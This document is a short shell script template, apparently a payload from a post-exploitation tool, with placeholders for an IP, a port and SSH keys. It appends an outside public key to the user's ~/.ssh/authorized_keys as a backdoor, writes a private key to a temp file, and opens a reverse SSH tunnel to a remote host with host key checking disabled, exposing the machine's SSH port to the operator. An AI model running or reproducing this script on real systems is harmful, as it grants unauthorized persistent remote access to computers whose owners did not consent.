#!/bin/sh

IP="{{ ip }}"
PORT="{{ port }}"

echo "[+] User \"$(whoami)\""

tmp="$(mktemp)"

echo "[+] Storing private key in $tmp"

cat > "$tmp" << EOF
{{ ssh_private_key }}
EOF

bind="$(seq 10000 10099 | shuf | head -n1)"

echo "[+] Connecting to $IP:$PORT"
echo "[+] Binding to port $bind"

mkdir -p ~/.ssh/
echo '{{ ssh_public_key }}' >> ~/.ssh/authorized_keys

ssh \
	-N \
	-i "$tmp" \
	-p "$PORT" \
	-o 'StrictHostKeyChecking=no' \
	-o 'UserKnownHostsFile=/dev/null' \
	-R "$bind":localhost:22 \
	jc@"$IP"

echo "[+] SSH connection closed, cleaning up..."

rm -f "$tmp"

